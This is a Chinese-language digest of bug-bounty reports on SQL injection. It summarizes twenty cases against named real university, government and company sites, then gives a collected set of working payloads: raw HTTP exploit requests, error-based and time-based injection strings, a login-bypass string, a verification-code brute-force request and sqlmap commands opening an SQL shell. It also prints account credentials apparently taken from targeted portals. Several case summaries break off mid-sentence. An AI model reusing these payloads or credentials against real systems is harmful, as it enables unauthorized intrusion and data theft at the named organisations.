# SRC 实战报告提炼 — sql_injection

> 来源：蚂蚁SRC榜一Clown的 86 份实战报告
> 提取时间：2026-09-14

## 典型案例摘要（20 份）

### 记录某实际系统的浅度测试（水文）

记录授权系统的测试 前言 此系统只是浅度测试，领导让我随便测测就行，各位大哥勿喷。目的主要还是用实际系统告诉还未工作的哥哥们，可能工作的系统有些比你挖的src叼，但肯定也有很low的，加油！ 正文部分 既然是授权了，一般情况下确定了这个ip，当时客户给我了一个前台810端口下的，IP访问，也不用想什么域名，测一下目录找找后台，或者nmap扫一下端口，看看后台是不是在其他端口就可以了，这里很简单，后台很好找，就在admin目录下，如下图 其他用于写报告的漏洞这里就不写了 先看以下前台 1、SQL注入漏洞 一般情况下还是想看看新闻详情页面，总觉得此页面会存在漏洞，但是很不友好，此页面测试了以下，过

### 逻辑漏洞--任意密码重置

19.02.06丨星期三丨晴天 第一种：验证码可爆破 标志为验证码为4/5位纯数字，以及验证码为前端进行刷新（该情况最为常见，一般在补天专属都是高危的） 案列：当当网任意用户密码修改漏洞 http://m.dangdang.com/forget_psd.php?sid=e14aa9b65e0f4d05 输入要更新帐号的手机号码，然后提交。 下一步，对验证码进行暴破，由于验证码只4位。。网速乐观的情况下，数分钟就能破解出来。 也不多说了，经测试，成功破解了数个帐号。 POST /verify_fp.php?sid=e88bf0a11d2e7920 HTTP/1.1 Host: m.dangdan

### UsualToolCMS最新版a_templetex.php文件存在sql注入

1.环境 环境版本信息：UsualToolCMS-8.0-Release 版本下载：http://www.a5xiazai.com/php/140604.html 官网下载：https://cms.usualtool.com/down/UsualToolCMS-8.0-Release.zip 2.漏洞分析 在./cmsadmin/a_templetex.php文件第137行，paths变量没有过滤，136行从get处获取paths，没有任何过滤 当从get处获得的t等于open时就可以出发这个sql注入，在文件第129行 构造payload：cmsadmin/a_templetex.php?t

### edusrc挖掘技巧1

edusrc挖掘技巧 对于新人刚开设挖edusrc的时候需要花大量的时间来找系统和信息收集，当你遇见的系统又waf的时候可以适当的放弃别再这上面花时间了，列入sql注入，一个单引号尝试报错和闭合（最多就是把简单的绕过尝试一下）如果不行，那就果断放弃，xss的话在edu的模块是不需要花大量时间，但是为了后面的企业src可以更好的理解xss可以尝试挖掘一些（在控制台弹窗测试，因为未授权，出了问题别找我）这就是对于top10漏洞的技巧。 主要还是说一些系统的收集方法： 利用fofa 语句：“系统” && org=“China Education and Research Network Center

### 众测下的SQL注入挖掘

众测下的SQL注入挖掘 0x01原理： sql注入的原理在这里就不在详细介绍了，我相信大多数师傅对sql注入都是有一定的理解，如果对sql注入了解不深入的可以详细的去学习一下基础，手工打打靶场，熟悉sql函数等。 当然我们在学习sql注入的时候我们一定要先去简单的了解各种数据库的特征 比如：exp()函数来测试注入点，exp(709)正常、exp(710)报错，mssql和mysql适用，oracle中exp()没有固定值，只要能执行我们输入的语句，就可能存在注入 其余对比有心人可以自己去整理，我相信对你之后在项目中挖掘sql注入会有很大的帮助 0x02测试方法：      在众测的时候可以对

### 广东工业大学 教育漏洞报告平台

广东工业大学 时间 单位 作者 等级Rank 2023-01-12 11:30:32 广东工业大学 (/list/firm/4948) blame_Adminhz (/profile/9738/) 中危 0 QAQ 广东工业大学高校考务服务平台存在SQL注入： 归属： 广东工业大学 | 教育漏洞报告平台 https://src.sjtu.edu.cn/post/189163/ 第1页 共5页 2023/1/28 9:08 漏洞url：http://gdut.cxservice.cn/login/login.html?a=gdut&p=ks 漏洞点学号激活处 单引号导致报错 bp抓包：发现加密可

### 汕头技师学院堆叠注入

抓包’判断 判断出有注入 使用堆叠注入 ‘;结束前面的语句 select 1/@@version-- 执行后面的语句 1/db_name() Uesr 1/user 都可以

### 四川省德昌县职业高级中学

四川省德昌县职业高级中学存在SQL注入漏洞 http://www.scdczz.cn/so.php 此处为漏洞URL 输入1'，网页报错同时爆出绝对路径，初步判定为POST型注入 使用burp抓包分析请求,并保存至文件12345.txt 打开sqlmap进行注入 此处可以通过注入获取库名，表名等 最终可以获取到管理员的账号密码并登入后台

### 贵州省人民政府存在SQL注入漏洞

贵州省人民政府存在SQL注入漏洞 网站地址: https://spzs.amr.guizhou.gov.cn/ 存在SQL注入漏洞的数据包, 注入参数为queryName POST /gz_society/society/production/list HTTP/1.1 Host: spzs.amr.guizhou.gov.cn Content-Length: 35 Sec-Ch-Ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109" Accept: application/json, text/plain, 

### 湖南弘林科学仪器有限公司sql注入

湖南弘林科学仪器有限公司sql注入 网站首页 http://www.hnsyyq.com/ 2抓包修改poc POST /delete_cart_goods.php HTTP/1.1 Host: www.hnsyyq.com:80 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Content-Length: 64 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip id=0||(updatexml

### 前台sql

FOFA搜索 app="华测监测预警系统2.2" /Web/SysManage/UserEdit.aspx?&ID=0 ID参数存在sql注入 http://112.101.195.234:8001/Web/SysManage/UserEdit.aspx?&ID=0'

### EDU宝典

前言：本文所有漏洞均已在 2022 年 8 月份前提交，当然为了观赏性，刨去了弱口令，扫描 器扫到的注入以及一些垃圾洞之后写下的本文，我本身也不咋刷 edu 的，也就今年简单的 刷了一点 rank 分，写这篇文章也是巩固一下自己的知识并且告诉大家如何挖到通杀~  （全文自己手打，所以肯定会有错，如果发现错误请及时联系本人~）      其实信息收集大部分文章都说的差不多了，来来回回炒那些冷饭也没意思，无非就是 fofa， hunter，然后查下 title=”后台”或者就是 oa，cms 的 1daynday 去打，要么就是 oneforall+子 域名挖掘机找下子域名进行收集    这里说一

### 华南理工大学2

华南理工大学 时间 单位 作者 等级 Rank 2022-12-29 17:46:24 华南理工大学 (/list/firm/4918) Awake (/profile/7705/) 中危 3 无描述... 统一门户存在sql注入 https://my.scut.edu.cn 202030301496 lalayou9999WZH 统一门户-应用中心-常用应用-全部应用-搜索-categorys参数 华南理工大学 | 教育漏洞报告平台 https://src.sjtu.edu.cn/post/186705/ 第1页 共3页 2023/1/30 9:09 数据包： POST https://my

### 河南省人民政府某站存在SQL注入漏洞

河南省人民政府某站存在SQL注入漏洞 地址: http://hnpostdoctor.hrss.henan.gov.cn/#/passport/login, 可以注册账号进去, 我这里注册好一个 账号qwert123 密码qwert123 进去后点击 “通知公告” 会触发一个接口 /erupt-api/data/table/Notice, 此接口存在SQL注入漏洞 POST /erupt-api/data/table/Notice HTTP/1.1 Host: hnpostdoctor.hrss.henan.gov.cn Content-Length: 77 Accept: applicati

### 中国移动 (1)

中国移动通信集团山东有限公司嘉祥分公司系统存在SQL注入漏洞 归属： 漏洞URL：http://zhihuifangxun.yuanzhihang.com/Home/Index/index_detail\?id\=1

### 上海交大

https://medcloud.sjtu.edu.cn/ POST /newpsw.php HTTP/1.1 Host: medcloud.sjtu.edu.cn Cookie: PHPSESSID=6p867sojnoe04q677t481kpf66 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/

### 浙江大学-存在sql注入-2

URL：http://birdflyzzx.yanmo.net/WebModel/Model1/cpxx.aspx?cp_id=21280 几处接口存在数据库名敏感信息泄露 为后续sql注入语句payload起到铺垫作用 点击企业新闻和供求信息 数据库名为 'YanMo' 回到目标网站 cpxx.aspx?cp_id=21280 + - * / and 都可以判断存在sql注入点 利用and构造sql注入语句 and 1=1 正常回显 and 1=0 错误回显 利用之前获得的数据库名 构造payload 页面正常回显 从而再次判断数据库名为'YanMo' cpxx.aspx?cp_id=212

### 吉林工业职业技术大学sql注入Bypass 教育漏洞报告平台

2022 © 联系邮箱：<EMAIL-REDACTED> (mailto:<EMAIL-REDACTED>) 吉林工业职业技术大学sql注入Bypass 时间 单位 开发商 作者 等级 Rank 2022-10-16 22:40:54 吉林工业职业技术学院 (/list/firm/3666) 海南翼智慧信息科技有限公司 (/list/company/315) Blame_深夜深夜看看 (/profile/8493/) 中危 4 无描述... 吉林工业职业技术大学海南翼智慧AIC flow工作流程系统存在sql注入，flow工作流程系统sql注入， 漏

### 浙江大学-sql万能密码

目标url：http://pay.chinasinew.com/login.aspx 资产归属证明，该资产属于浙江大学 万能密码进入后台，万能密码')or('a'='a 对浙大店内商店的所有的订单有相应的查询权限 所有收银机的退款密码 对登陆页面进行跑sqlmap python sqlmap.py -r 1.txt --batch --random-agent --time-sec=2 --risk 3 --is-dba python sqlmap.py -r 1.txt --batch --random-agent --time-sec=2 --risk 3 --sql-shell

### 同济大学(1)

教学管理信息系统存在接口未授权访问漏洞 http://myportal.tongji.edu.cn/new/index.html  账号密码：11142 密码Sxm195703 同济大学 | 教育漏洞报告平台 第1页 共11页 2023/1/3 9:29 接口1：/api/studentservice/teacherInfo/findTeacherInfoList 同济大学 | 教育漏洞报告平台 第2页 共11页 2023/1/3 9:29 接口2：/api/baseresservice/teacher/findTeacherList 泄露了2万多条数据 同济大学 | 教育漏洞报告平台 第3页

## 实战 Payload 集（30 条去重）

### HTTP请求

```
POST /verify_fp.php?sid=e88bf0a11d2e7920 HTTP/1.1
Host: m.dangdang.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://m.dangdang.com/verify_fp.php?sid=e88bf0a11d2e7920
Content-Type: application/x-www-form-urlencoded
action=verify&sid=e88bf0a11d2e7920&mobile=xxxx&verify=§v§&submit=%E6%8
POST /delete_cart_goods.php HTTP/1.1
Host: www.hnsyyq.com:80
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 64
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
id=0||(updatexml(1,concat(0x7e,(select%20md5(111)),0x7e),1))
可以看到执行了md5（111）的命令
3查看库名
修改poc
POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1 
Host: xxxx 
Content-Type: multipart/form -data; boundary= ----
WebKitFormBoundarymVk33liI64J7GQaK 
Content-Length: 368 
------WebKitFormBoundarymVk33liI64J7GQaK 
Content-Disposition: form-data; name="secId" 
1 
------WebKitFormBoundarymVk33liI64J7GQaK 
Content-Disposition: form-data; name="Filedata"; filename="hello.txt" 
Hello World！ 
------WebKitFormBoundarymVk33liI64J7GQaK 
Content-Disposition: form-data; name="plandetailid" 
1 
------W
```

### XSS

```
onsubmit='return
```

### SQL

```
sleep(5),1)--+
updatexml(1,concat(0x7e,(select%20md5(111)),0x7e),1))
updatexml(1,concat(0x7e,(select%20database()),0x7e),1))
and 1=1 正常回显
and 1=0 错误回显
and 1=2 sql命令不成立，结果为空或出错 ； 
and 1=1 sql命令成立，结果正常返回 。 
extractvalue(1,benchmark(25000
load_file()读取本地文件
or 1=1 恒为真时，返回全部数据，包括身份证，电话，住址等等。
updatexml(1,concat(0x7e,(select database()),0x7e),1)) -- q
sleep(3)-- -&other=xxx方式来注入成功（打破了只要
sleep(3)-
sleep(3)-- -, 总 的 sql 语 句 成 为
sleep(3)-- -
```

### URL

```
http://192.168.8.108:8081/UsualToolCMS-8.0-Release/cmsadmin/a_login.php?do=login'
http://192.168.8.108:8081/UsualToolCMS-8.0-Release/cmsadmin/a_templetex.php?t=open&id=1&paths=templete/index'
```

### curl

```
curl 语句（工具地址 https://github.com/vulhub/Apereo-CAS-Attack/releases/tag/v1.0.0） 
```

## 技术手法统计

- 漏洞利用: 13 次
- 提权: 9 次
- 接口发现: 7 次
- WAF/过滤绕过: 4 次
- 参数篡改: 4 次
- 漏洞链: 1 次
- 枚举/爆破: 1 次

